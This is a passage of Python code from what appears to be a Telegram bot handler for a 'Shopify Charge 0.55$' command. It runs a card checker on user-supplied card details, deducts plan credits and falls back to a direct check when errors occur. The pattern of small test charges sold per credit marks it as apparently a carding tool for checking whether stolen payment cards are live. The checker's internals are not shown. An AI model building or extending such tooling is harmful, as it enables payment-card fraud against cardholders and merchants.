<b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
<b>[•] Status</b>- <code>Processing...</code>
<b>[•] Response</b>- <code>Checking card...</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Plan:</b> {plan_name}
<b>[+] User:</b> @{username}
━━━━━━━━━━━━━━━
<b>Checking card... Please wait.</b>
"""
        )

        # Create checker instance
        checker = ShopifyChargeChecker(user_id)

        # Process command through universal charge processor if available
        if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
            try:
                # Try to use charge processor
                result = await charge_processor.execute_charge_command(
                    user_id,                    # positional
                    checker.check_card,         # positional
                    card_details,               # check_args[0]
                    username,                   # check_args[1]
                    user_data,                  # check_args[2]
                    credits_needed=2,           # keyword
                    command_name="sh",          # keyword
                    gateway_name="Shopify Charge"  # keyword
                )
                
                # Handle the result
                if isinstance(result, tuple) and len(result) == 3:
                    success, result_text, credits_deducted = result
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                elif isinstance(result, str):
                    await processing_msg.edit_text(result, disable_web_page_preview=True)
                else:
                    # Fallback to direct check
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                    
            except Exception as e:
                print(f"❌ Charge processor error: {str(e)}")
                # Fallback to direct check
                try:
                    result_text = await checker.check_card(card_details, username, user_data)
                    await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                except Exception as inner_e:
                    await processing_msg.edit_text(
                        f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(inner_e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                    )
        else:
            # Fallback to direct check if charge_processor not available
            try:
                result_text = await checker.check_card(card_details, username, user_data)
                await processing_msg.edit_text(result_text, disable_web_page_preview=True)
            except Exception as e:
                await processing_msg.edit_text(
                    f"""<pre>❌ Processing Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: Error processing Shopify charge.
🠪 <b>Error</b>: <code>{str(e)[:100]}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━"""
                )

    except Exception as e:
        error_msg = str(e)[:150]
        await message.reply(f"""<pre>❌ Command Error</pre>
━━━━━━━━━━━━━
🠪 <b>Message</b>: An error occurred while processing your request.
🠪 <b>Error</b>: <code>{error_msg}</code>
🠪 <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
━━━━━━━━━━━━━""")
